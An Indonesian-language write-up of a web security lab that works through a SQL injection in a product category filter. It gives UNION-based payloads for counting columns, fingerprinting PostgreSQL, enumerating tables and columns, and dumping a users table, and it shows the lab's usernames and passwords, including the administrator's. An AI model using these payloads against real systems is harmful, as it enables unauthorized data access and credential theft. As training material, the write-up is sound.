# Overview
web app vuln dengan SQLI di bagian product category filter

Hints:
- terdapat login page
- harus enumerate apa nama tabel
- didalam tabel terdapat kolom usernames dan passwords


Goals:
- guankan SQLI dan dapatkan creds `administrator` dan login sebagai user tersebut

# Analisis
cek apakah vuln SQLI dengan `'`

selanjutnya cek jumlah kolom yang digunakan query asli dengan `' order by 2#/--`

lalu cek kolom yang bisa hold string `' union select 'a','a'--`

selanjutnya kita bisa coba untuk cek apa db yang digunakan `' union select version(),null`
ternyata db yang digunakan adalah postgresql.

selanjutnya kita cari tahu nama-nama tabel yang ada dengan `' union select table_name,null from information_schema.tables#/--` . Dan hasilnya
```
...
user_defined_types
...
pg_statio_user_sequences
...
pg_user_mappings
...
pg_stat_xact_user_functions
...
user_mappings
...
pg_stat_user_tables
...
user_mapping_options
...
pg_stat_xact_user_tables
...
pg_statio_user_tables
...
users_tnxcwt
...
pg_stat_user_indexes
...
pg_statio_user_indexes
...
pg_user
...
pg_stat_user_functions
...
``` 

Terdapat beberapa tabel dengan keyword `user`, namun ada 2 tabel yang paling menarik, `pg_user` dan `users_tnxcwt`. Selanjutnya kita coba lihat list kolom dari tabel tersebut dengan cara `' union select column_name,null from information_schema.columns where table_name='nama_tabel'--`
- `pg_user` return internal error
- `users_tnxcwt` return 200 OK

Ketika kita lihat, berikut adalah nama kolom yang ada di tabel tersebut
```
password_mbmgam
email
username_chwjie
```
Selanjutnya kita dapat melihat isinya dengan cara `'+union+select+username_chwjie,password_mbmgam+from+users_tnxcwt--`, dan menghasilkan:
```
carlos
	vzdt8td2gdeyi2y81q7h
wiener
	s2iwkan47lyrbryz6p51
administrator
	6mpx1i8520jbls08amuj
```
selanjutnya kita dapat login dengan akun administrator untuk menyelesaikan challenge